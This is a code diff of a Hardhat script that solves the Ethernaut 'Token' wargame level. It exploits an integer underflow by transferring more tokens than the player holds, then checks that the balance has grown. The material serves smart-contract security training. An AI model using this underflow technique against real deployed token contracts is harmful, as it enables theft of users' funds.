@@ -2,7 +2,7 @@ import { ethers } from "hardhat";
 
 const attackToken = async () => {
     // change contract addresses here.
-    const tokenAddress = "0x0C58E5e591a856395748e7A2a1266d94c7aB4c6E"; //type "await contract.address()" in ethernaut console
+    const tokenAddress = "0x5e5925E07a04740Dd4ECfD502e326fE59f5B5d5a"; //type "await contract.address()" in ethernaut console
     // const player = ""; //place your player address here (you may type player in ethernaut console)
     const args: [] = [];
     const player = process.env.PRIVATE_KEY || "";
@@ -57,16 +57,16 @@ const attackToken = async () => {
 
     const contract = await ethers.getContractAt(ABI, tokenAddress);
     console.log("Checking current player balance...");
-    const playerBalance = await contract.balanceOf(players.address);
+    let playerBalance = await contract.balanceOf(players.address);
     console.log(`Current player balance: ${playerBalance} TOKENS`);
     console.log("Causing underflow by transfering more than the starting 20 TOKENS...");
     const underflow = await contract.transfer("0x0000000000000000000000000000000000000000", 21);
     const wait1 = await underflow.wait();
     console.log(wait1);
     console.log("Checking current player balance again...");
-    const NewPlayerBalance = await contract.balanceOf(players.address);
-    console.log(`Current player balance: ${NewPlayerBalance} TOKENS`);
-    if (NewPlayerBalance > playerBalance) {
+    playerBalance = await contract.balanceOf(players.address);
+    console.log(`Current player balance: ${playerBalance} TOKENS`);
+    if (playerBalance > 20) {
         console.log("Congrats Level Passed, submit to ethernaut...");
     } else {
         console.log("No Additional tokens, review code above and try again...");
